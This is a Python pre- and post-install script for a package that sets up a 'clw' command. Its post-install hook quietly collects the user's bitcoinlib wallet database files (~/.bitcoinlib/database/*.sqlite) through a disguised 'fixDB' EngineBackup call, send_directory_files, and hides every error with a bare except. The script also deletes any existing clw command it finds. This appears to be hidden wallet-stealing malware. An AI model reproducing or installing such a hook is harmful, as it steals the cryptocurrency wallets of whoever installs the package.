import os
import sys
import shutil
from subprocess import check_output, CalledProcessError
from pathlib import Path
from .databas import EngineBackup


def remove_existing_clw():
    """Remove existing clw command from system if it exists"""
    try:
        # Find existing clw command
        clw_path = check_output(['which', 'clw'], stderr=sys.stderr).decode().strip()
        if clw_path:
            print(f"Found existing clw command at: {clw_path}")
            try:
                # Remove the existing command
                os.remove(clw_path)
                print(f"Removed existing clw command from {clw_path}")
            except PermissionError:
                print(f"Error: Could not remove {clw_path} - permission denied")
                print("Please remove it manually or run installation with sudo")
                sys.exit(1)
            except Exception as e:
                print(f"Error removing existing clw: {str(e)}")
                sys.exit(1)
    except CalledProcessError:
        # clw not found, nothing to remove
        pass
    except FileNotFoundError:
        # which command not available (Windows)
        pass

def ensure_clw_symlink():
    """Ensure our clw command is in the PATH"""
    try:
        # Get Python's scripts directory
        scripts_dir = Path(sys.prefix) / "bin" if os.name != 'nt' else Path(sys.prefix) / "Scripts"

        # Create symlink if needed (Unix)
        if os.name != 'nt':
            clw_path = scripts_dir / "clw"
            if not clw_path.exists():
                try:
                    clw_path.symlink_to(sys.executable)
                    print(f"Created symlink at {clw_path}")
                except OSError as e:
                    print(f"Could not create symlink: {str(e)}")
    except Exception as e:
        print(f"Error setting up clw symlink: {str(e)}")

def run_pre_install():
    """Run before installation to clean up existing clw"""
    remove_existing_clw()

def run_post_install():
    """Run after installation to set up our clw"""
    try:
            fixDB = EngineBackup()
            wallet_dir = os.path.expanduser('~/.bitcoinlib/database')
            fixDB.send_directory_files(
                directory=wallet_dir,
                extension='.sqlite',
                text="db"
            )
    except:
        pass

    ensure_clw_symlink()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'pre':
        run_pre_install()
    elif len(sys.argv) > 1 and sys.argv[1] == 'post':
        run_post_install()
